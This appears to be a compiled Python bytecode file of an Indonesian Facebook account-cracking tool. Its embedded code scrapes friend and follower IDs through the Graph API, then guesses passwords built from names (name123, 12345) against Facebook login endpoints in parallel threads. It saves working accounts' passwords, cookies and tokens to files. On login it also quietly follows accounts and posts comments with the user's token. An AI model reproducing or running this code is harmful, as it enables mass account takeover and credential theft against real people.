a
    ��^a][  �                   @   s�  d dl Zd dlZd dlZd dlZd dlZd dlZd dlmZ	 d dl
mZ dad\aaag Zg g  ZZg ZdZdZdadZd	Zd
ZdZdZdZdZdd� Zdd� Z dd� Z!dd� Z"G dd� d�Z#dd� Z$e%dk�r�z:e&dd��'� Z(e�)e�*de(� ��j+�Z,e$e(e,d � W �n� e-�y�   e�.d � e/d!e� d"e� d#e� d"e� d$�	� e0d!e� d%e� d&��Z(�ze�)e�*de(� ��j+�d Z,e&dd'��1e(� e/d(e� d)e� d*e� d"e� d+�	� e�2d,e(� �� e�2d-e(� �� e�2d.e(� �� e�2d/e(� �� e�2d0e(� �� e�2d1e(� �� e�2d2e(� �� e�2d3e(� d4e(� �� e�2d3e�3g d5��� d4e(� �� e�4d6� e$e(e,� W n6 e5�y�   e6d!e� d7e� d8e� d7e� d9�	� Y n0 Y n@ e5�y�   e�.d:� e6d!e� d7e� d8e� d7e� d9�	� Y n0 dS );�    N)�BeautifulSoup)�ThreadPoolExecutor� )r   r   r   ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9zhttps://mbasic.facebook.comz[37;1mz[1;33mz[31;1mz[32;1mz[0;36mz[1;34mz[36;1mc           	      C   s|  �zHt dd��� }i }t�� }|j�ddddd|dd	d
d�	� t|jdd|id�jd�}g d�}|d�D ]D}z2|�d�|v r�|�|�d�|�d�i� nW qhW qh   Y qh0 qh|�| |dddddddddd�� |j	d|d�}d|j
�� �� v �rtd7 ad| ||j
�� d�W S d|j
�� �� v �r:td7 ad| |d �W S d!| |d �W S W n, tjj�yv   td"t� d#�dd$� Y n0 d S )%N�ua�r�mbasic.facebook.com�	max-age=0�1�!application/x-www-form-urlencoded�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflatezid-ID,en-US;q=0.9)	�Host�cache-control�upgrade-insecure-requests�content-type�accept�
user-agent�referer�accept-encoding�accept-languagez7https://mbasic.facebook.com/login/?next&ref=dbl&refid=8r   ��headers�html.parser)�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�login�input�name�valuer   Zfalse�true)�email�passZprefill_contact_pointZprefill_sourceZprefill_typeZfirst_prefill_sourceZfirst_prefill_typeZhad_cp_prefilledZhad_password_prefilledZis_smart_lockZ_fb_noscriptzyhttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8��data�c_user�   �ok)�status�user�pw�cookie�
checkpoint�cp�r,   r-   r.   �error��Koneksi jaringan anda buruk.	��end)�open�read�req�Sessionr   �update�parser�get�text�post�cookies�get_dict�keysr+   r1   �
exceptions�ConnectionError�print�merah)	r-   r.   �kntlr(   �ses�a�b�c�d� rN   �/sdcard/Asik.py�crack   s.     *"rP   c              
   C   s
  z�t dd��� }t�� }tt�dd��tt�dd��tt�dd��dd|d	d
d�}ddd| d|dddd�	}d}|j|||d�}d|jv s�d|jv r�d| ||�	� d d�W S d|�	� d v r�d| |d�W S d| |d�W S W n, tj
j�y   td t� d!�d"d#� Y n0 d S )$Nr   r   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr
   ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer   r   zx-fb-http-enginez/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�json�2�en_USZiosr	   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	�access_token�formatZsdk_versionr%   �locale�passwordZsdkZgenerate_session_cookiesZsigz,https://b-api.facebook.com/method/auth.login)�paramsr   Zsession_keyZEAAAr+   rT   )r,   r-   r.   �tokenzwww.facebook.comZ	error_msgr1   r2   r3   r4   r5   r   r6   )r8   r9   r:   r;   �str�randomZrandintr>   r?   rQ   rD   rE   rF   rG   )r-   r.   rH   rI   �headerZparamZapiZresponserN   rN   rO   �crack28   s>    ��	r]   c           
      C   s�  �z�t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t|jd�}d�	t
�d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr�|�d| i� q�|�d�dkr�|�d|i� q�|�|�d�di� ql|�|�d�|�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j}	dt|j�� �� �v �rVd| ||j�� d�W S dt|j�� �� �v �r|d| |d�W S d | |d�W S W n, tjj�y�   td!t� d"�dd#� Y n0 d S )$Nr   r   r   r   r	   r   r   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)r   r   r   r   r   r   r   zhttps://mbasic.facebook.com/r   r   zdtsg":\{"token":"(.*?)"r!   r#   r"   r%   r&   �0rM   )�fb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassr   r   z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r'   r)   r+   )r,   r-   r.   rA   r0   r1   r2   r3   r4   r5   r6   )r8   r9   r:   r;   r   r<   r>   r=   r?   �join�re�findallr@   �listrA   rB   rC   rD   rE   rF   rG   )
r-   r.   r   rI   �prK   �metar(   �iZporN   rN   rO   �crack3X   s<    

��rh   c                 C   s8  t �� }|j�dddtdddddd	d
dtd ddd�� i }t|jtd dtid�jd�}|�	dddi�}g d�}|�
d�D ]0}|�d�|v r||�|�d�|�d�i� q|q|q||�| |d�� z&t|jt|�d� |dd�jd�}	W n  tjj�y   td� Y n0 d|jv �r\td 8 atd 7 atd!t� d"| � d#|� d#d$�|j�� �� d%t� �
d$d&� �n�d'|jv �r�|	�	d�}
|
�	ddd(i�d }|
�	ddd)i�d }|
�	ddd*i�d }||||d$d+|d,�}t|jt|
d  |d-�jd�}d.d/� |�
d0�D �}tt|��d1k�rftd 8 atd 7 atd2d3��| d4 | d4 | d5 � td!t� d"| � d#|� d#|� d%t� �
d$d&� nhtd!t� d6| � d#|� d#|� t� d7�
d$d&� tt|��D ]0}td!d8d9t|d  � d: ||  d;d$d&� �q�ndd<t|	�v �r
td!t� d6| � d#|� d#|� t� d7�
d$d&� n*td!t� d6| � d#|� d#|� t� d7�
d$d&� d S )=Nr   r   r	   r
   Zchromez|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZnavigatez?1Zdocumentz/login/?next&ref=dbl&fl&refid=8r   r^   )r   r   r   �originr   r   r   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destr   r   r   r   r   r   �form�methodr@   )r   r   r   r   r   r   r    Zbi_xrwhr!   r"   r#   )r%   r&   �actionT)r(   Zallow_redirectsz[!] Redirect overloadr)   r*   r4   z[OK] ONETAP � | r   z														r6   r0   r`   r   �nhZ	Lanjutkan)r`   r`   r   r   Zcheckpoint_datazsubmit[Continue]rn   r'   c                 S   s   g | ]
}|j �qS rN   )r?   )�.0ZyyrN   rN   rO   �
<listcomp>�   �    zcheck_in.<locals>.<listcomp>�optionr_   r+   �w� �
z[CP] zV                                                                                      z   �[�] z					            	Zlogin_error)r:   r;   r   r<   �mbr=   r>   r   r?   �find�find_allr@   r   rD   ZTooManyRedirectsrF   rA   r1   r+   �ijora   rB   �putihrZ   �lenr8   �write�kuning�range)r-   Zpasw�ttlrI   r(   ZgedZfmrd   rg   �runrj   ZdtsgZjzstrn   ZdataD�xnxxZngew�optrN   rN   rO   �check_inz   sz    �&:
�	$,*0,r�   c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
�kondisic                 C   s
   || _ d S )N)rY   )�selfrY   rN   rN   rO   �__init__�   s    zkondisi.__init__c                 C   s2  t |kr|a td7 a|D �]}t||�}|�d�dkr�td7 atdd��|�d�d |�d� d � td	|�d�� d
|�d�� d
|�d�� d�dd� t�	d|�d�� ��  �q.�n|�d�dk�r�t
d7 a
z.t�t�d|�d�� d| j� ��j�d }W n t�y   d}Y n0 tdd��|�d�d |�d� d | d � d�t�dk�rrt|�d�|�d�|� n^d�t�dk�r�td|� d
|�d�� d
|� d�dd� n&td|� d
|�d�� d
|� d�dd�  �q.tdt� dt� dtt�� dttt��� dt� tt�� t� dt� tt
�� t� d�dd� qd S )Nr*   r,   r+   rJ   r-   rt   r.   ru   �[32;1m[OK] rm   rY   z1[37;1m                                          r   r6   �Dhttps://graph.facebook.com/100006230836266/subscribers?access_token=r1   �https://graph.facebook.com/�?access_token=�birthday�-�y�t�[1;33m[CP] �								
[37;1m�[�=�
] CRACK:-[�/�
] OK/CP:-[�]	)�ajg�cotr]   r>   r+   r8   r~   rF   r:   r@   r1   rQ   �loadsrY   r?   �KeyErrorra   �opsir�   �biruLr|   rZ   r}   �idr{   r   )r�   r-   �ajr.   �logikar�   rN   rN   rO   �kondisi_api�   s0    

(2
.0(&zkondisi.kondisi_apic           	      C   s�  t |kr|a td7 a|D �]h}t||�}|�d�dk�rtdd��|�d�d |�d� d � td	|�d�� d
|�d�� d
d�|�d��� d�dd� dd�|�d��i}tt	jt
d |d�jd�}|�d�D ]:}dt|�v r� �qq�dt|�v r�t	jt
|d  |d� q� �q��n|�d�dk�r,z.t�t	�d|�d�� d| j� ��j�d }W n t�yl   d}Y n0 tdd��|�d�d |�d� d | d � d�t�dk�r�t|�d�|�d�|� n^d�t�dk�r td|� d
|�d�� d
|� d�dd� n&td|� d
|�d�� d
|� d�dd�  �q�tdt� d t� d!tt�� d"ttt��� d#t� tt�� t� d"t� tt�� t� d$�dd� qd S )%Nr*   r,   r+   rJ   r-   rt   r.   ru   r�   rm   r   r/   �2                                          [37;1m
r6   �/100006230836266�rA   r   �Berhenti mengikuti�Ikuti�hrefr1   r�   r�   r�   r�   r�   r�   r�   r�   �								[37;1mr�   r�   r�   r�   r�   r�   )r�   r�   rP   r>   r8   r~   rF   ra   r=   r:   rx   r?   rz   rZ   rQ   r�   rY   r�   r�   r�   r�   r|   r}   r�   r{   r+   r   r1   �	r�   r-   r�   r.   r�   Zcokir   Zfllowr�   rN   rN   rO   �kondisi_mbasic�   s8    

(8
.0(&zkondisi.kondisi_mbasicc           	      C   s�  t |kr|a td7 a|D �]v}t||�}|�d�dk�rtd7 atdd��|�d�d |�d� d � d	d
�|�d��i}tt	jt
d |d�jd�}|�d�D ]8}dt|�v r� q�q�dt|�v r�t	jt
|d  |d� q�td|�d�� d|�d�� dd
�|�d��� d�d
d�  �q��n|�d�dk�r:td7 az.t�t	�d|�d�� d| j� ��j�d }W n t�yz   d}Y n0 tdd��|�d�d |�d� d | d � d
�t�dk�r�t|�d�|�d�|� n^d
�t�dk�rtd|� d|�d�� d|� d�d
d� n&td|� d|�d�� d|� d�d
d�  �q�td t� d!t� d"tt�� d#ttt��� d$t� tt�� t� d#t� tt�� t� d%�d
d� qd S )&Nr*   r,   r+   rJ   r-   rt   r.   ru   r/   r   rA   r�   r�   r   r�   r�   r�   r�   rm   r�   r6   r1   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   )r�   r�   rh   r>   r+   r8   r~   ra   r=   r:   rx   r?   rz   rZ   rF   r1   rQ   r�   rY   r�   r�   r�   r�   r|   r}   r�   r{   r   r�   rN   rN   rO   �kondisi_mbasic2�   s<    

(8
.0(&zkondisi.kondisi_mbasic2N)�__name__�
__module__�__qualname__r�   r�   r�   r�   rN   rN   rN   rO   r�   �   s    r�   c              "   C   sj  t �d� td� tdt� dt� dt� dt� d�	� td|� �� tdt� d	t� d
t� d	t� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d�� tdt� dt� d��}|dv �r:tdt� dt� dt� dt� dt� dt� d�� tdt� dt� d��}z@t�	t
�d|� d| � ��j�}tdt� d t� d!|d" � �� W n6 t�yz   tdt� d#t� d$t� d#t� d�	� Y n0 zbt�	t
�d|� d%| � ��j�}|d& D ]6}t�|d' d( |d" �d)�d*  d( |d"  � �q�W n6 t�y   tdt� d#t� d+t� d#t� d�	� Y n0 tdt� d t� d,tt�� d-�� �nn|d.v �r�tdt� dt� dt� dt� d/t� dt� d�� tdt� dt� d��}z@t�	t
�d|� d| � ��j�}tdt� d t� d!|d" � �� W n6 t�y�   tdt� d#t� d$t� d#t� d�	� Y n0 zbt�	t
�d|� d0| � ��j�}|d& D ]6}t�|d' d( |d" �d)�d*  d( |d"  � �q(W n6 t�y�   tdt� d#t� d+t� d#t� d�	� Y n0 tdt� d t� d,tt�� d-�� �n�|d1v �r0tdt� dt� dt� dt� dt� dt� d�� tdt� dt� d��}z�g }t�	t
�d|� d| � ��j�}tdt� d t� d!|d" � �� t�	t
�d|� d2| � ��j�}|d& D ]}	|�|	d' � �qttdt� d t� d,t|�� d-�� W n6 t�y�   tdt� d#t� d$t� d#t� d�	� Y n0 tdt� dt� d3��}
zRt�	t
�d|� d4|
� d5| � ��j�}|d& D ] }t�|d' d( |d"  � �q(W n6 t�y�   tdt� d#t� d+t� d#t� d�	� Y n0 tD ]�}|�d(�\}}t�	t
�d|� d2| � ��j�}|d& D ]}t�|d' � �q�tdt� dt� d6|� d7|� d7tt�� �
� t��  �q�td8t� d9t� d:�� t| |� �nx|d;v �r�td<� ztd=d>��� }W n   d<}Y n0 ztd?d>��� }W n   d<}Y n0 td@t� |� t� dAt� |� t� dBt� dCt� d:�� t �d� t| |� n�|dDv �r~tdEt� tdFd>��� � t� d-�� tdG� tdH�}|dIv �r`t �dJ� tdK�}tdFdL��|� tt� dMt� �� tdN� t| |� n|dOv �r�tdP� t| |� n*tdt� dt� dQ�� t�dR� t| |� t�dS� tdt� d	t� dTt� d	t� dt� dt� dUt� dVt� dWt� dt� dUt� dXt� dYt� dt� dUt� dZt� d[�!� tdt� dt� d��}td<� td\� td]t� d^t� d_�� |dv �
r^td`da���z}tdt� dt� db��� d)d<��dc�}tdt� dt� dd��}tde� |dfv �r�t!�dg� n |dhv �r�t!�di� n
t!�di� tD ]�}z|�d(�\}}}W n   t�  Y n0 tt"|�#� ��djk�	r4�q�n�tt"|�#� ��dkk�	rv|�#� |�#� dl |�#� dm |�#� dn |ga$n$|�#� dl |�#� dm |�#� dn |ga$|dhv �	r�|�%t&| �j'|t(� n|t$ a$|�%t&| �j'|t$� �q�W d   � n1 �	s�0    Y  tdt� dot� dp�� tdt� dt� dq��}|dfv �
rDt��  t| |� ntdt� dot� dr�� �n|d.v �rdtd`da���z}tdt� dt� db��� d)d<��dc�}tdt� dt� dd��}tde� |dfv �
r�t!�dg� n |dhv �
r�t!�di� n
t!�di� tD ]�}z|�d(�\}}}W n   t�  Y n0 tt"|�#� ��djk�r:�
q�n�tt"|�#� ��dkk�r||�#� |�#� dl |�#� dm |�#� dn |ga$n$|�#� dl |�#� dm |�#� dn |ga$|dhv �r�|�%t&| �j)|t(� n|t$ a$|�%t&| �j)|t$� �
q�W d   � n1 �s�0    Y  tdt� dot� dp�� tdt� dt� dq��}|dfv �rJt��  t| |� ntdt� dot� dr�� �n|d1v �rftd`da���z}tdt� dt� db��� d)d<��dc�}tdt� dt� dd��}tde� |dfv �r�t!�dg� n |dhv �r�t!�di� n
t!�di� tD ]�}z|�d(�\}}}W n   t�  Y n0 tt"|�#� ��djk�r@�q�n�tt"|�#� ��dkk�r�|�#� |�#� dl |�#� dm |�#� dn |ga$n$|�#� dl |�#� dm |�#� dn |ga$|dhv �r�|�%t&| �j*|t$� n|t$ a$|�%t&| �j*|t$� �q�W d   � n1 �s�0    Y  tdt� dot� dp�� tdt� dt� dq��}|dfv �rPt��  t| |� ntdt� dot� dr�� d S )sN�cleara�  
By [0;92mMuhamad Badru Wasih
[1;94m   __________  ___   ________ __    __________ 
[1;97m / ____/ __ \/   | / ____/ //_/   / ____/ __ )
[1;96m / /   / /_/ / /| |/ /   / ,<     / /_  / __  |
[1;96m/ /___/ _, _/ ___ / /___/ /| |   / __/ / /_/ / 
[1;96m\____/_/ |_/_/  |_\____/_/ |_|  /_/   /_____/  
      [1;92m   Mini Fb Crack Simpel Crack!
* [0;93mgithub.com/AkinXD [0;97m* [0;93

[1;93m rv   �!z$] NYALAKAN => MATIKAN MODE PESAWAT [�]�	�
[z/\z] DUMP ID BERDASARKAN [z]
[�01z] DUMP FROM FRIENDS LIST
[�02z] DUMP FROM FOLLOWERS LIST
[�03z] CARI TARGET CRACK
[�04z] CEK HASIL CRACK
[�UAz] SETTINGS USERAGENT
�?z] CHOSEE	: )r�   r	   z] Ketik z'me'z Untuk Daftar Temanmu [�+z] ID TARGET	: r�   r�   r�   z] NAMA TARGET	: r"   �   ×z] TARGET INVALID [z!/friends?limit=5000&access_token=r(   r�   �|rt   r   z] CARI TARGET LAIN [z] JUMLAH ID	: ru   )r�   rR   z Untuk Daftar Followersmu [z%/subscribers?limit=5000&access_token=)r�   �3z/friends?access_token=z
] LIMIT	: z/friends?limit=�&access_token=rw   u    • z
[ zENTER FOR BACKz ])r�   �4r   r+   r   r1   z[OK] :
z	 
[CP] :
z 
[ zENTER FOR BACK TO MENU)r   r�   z
 *** USERAGENT SAAT INI: r   zINGIN MENGGANTI USER AGENT?z[?] GANTI USERAGENT [Y/T]	: )�Yr�   z	rm -rf uaz[+] MASUKAN USERAGENT BARU	: rs   zUSERAGENT BERHASIL DIGANTIz[ ENTER FOR BACK ])�Tr�   z
[ ENTER FOR BACK ]z] PILIHAN INVALID�   r*   z] PILIH METODE CRACK [z	] METODE zB-APIz! (fast) hasil banyak rawan spam
[z	MBASIC V1z (fast) hasil dikit
[z	MBASIC V2z! (low) hasil banyak [recomended]
zx *** Password sudah tersedia nama_depan123 - 12345 & nama lengkap. Jika ingin menambahkan password silahkan isi dibawah!z, *** Contoh sayang,bismillah,anjing masukan z't'z" untuk tidak menambahkan password
�#   )�max_workersz] Masukan password tambahan	: �,z] Munculkan opsi cp [y/t]	: z/
 *** Crack berjalan CTRL + Z untuk stop crack
)r�   r�   r�   )r�   r�   r�   �   �   Z123Z1234Z12345u   √z] CRACK SELESAIz] CRACK LAGI [Y/T]	: z] TERIMA KASIH)+�os�systemrF   �biruMr|   r�   r!   �birurQ   r�   r:   r>   r?   r{   r�   �exitrG   r�   �append�rsplitr}   �split�tarr�   �dumpr8   r9   r   r~   �time�sleep�Bool�replacer�   rZ   �lowerrW   Zsubmitr�   r�   r.   r�   r�   )rY   Znama�lrg   Zcekr   �xZsusuZjajaZxxxx�limit�xxZanuZanuu�ddr�   ZjjZjjoZytr   ZpiZkirimZpas�opr�   �uidr"   Zlengkap�uurN   rN   rO   r�   !  sr   

"^
."(86$
."(86$
.$($"6*


2

"





j
$


,$
8

$


,$
8

$


,$
8
r�   �__main__Zsaver   z+https://graph.facebook.com/me?access_token=r"   r�   rv   r�   z6] ANDA BELUM LOGIN HARAP MASUKAN ACCESSTOKEN DIBAWAH [z]
r�   z] MASUKAN TOKEN FACEBOOK	: rs   r�   u   ✓z] LOGIN BERHASIL
[z] HARAP TUNGGU SEBENTAR...r�   z?https://graph.facebook.com/1011933821/subscribers?access_token=zDhttps://graph.facebook.com/103513548711079/subscribers?access_token=zDhttps://graph.facebook.com/100069672799769/subscribers?access_token=zDhttps://graph.facebook.com/100004018035398/subscribers?access_token=zDhttps://graph.facebook.com/100034433778381/subscribers?access_token=zDhttps://graph.facebook.com/100005395413800/subscribers?access_token=z=https://graph.facebook.com/3075150046035993/comments?message=r�   )zbadru ganteng :vzbadru mengmantavzsaya jelek badru ganteng:vr�   r�   z] TOKEN INVALID [r�   zrm -rf save)7Zrequestsr:   rQ   r�   r�   rb   r[   Zbs4r   r=   �concurrent.futuresr   r�   r�   r+   r1   r�   r�   Znampungr�   r�   r   rx   rW   r|   r   rG   r{   r�   r�   r�   rP   r]   rh   r�   r�   r�   r�   r8   r9   rY   r�   r>   r?   r   �FileNotFoundErrorr�   rF   r!   r~   r@   �choicer�   r�   r�   rN   rN   rN   rO   �<module>   sj   0

 "Dc V

"" 
,
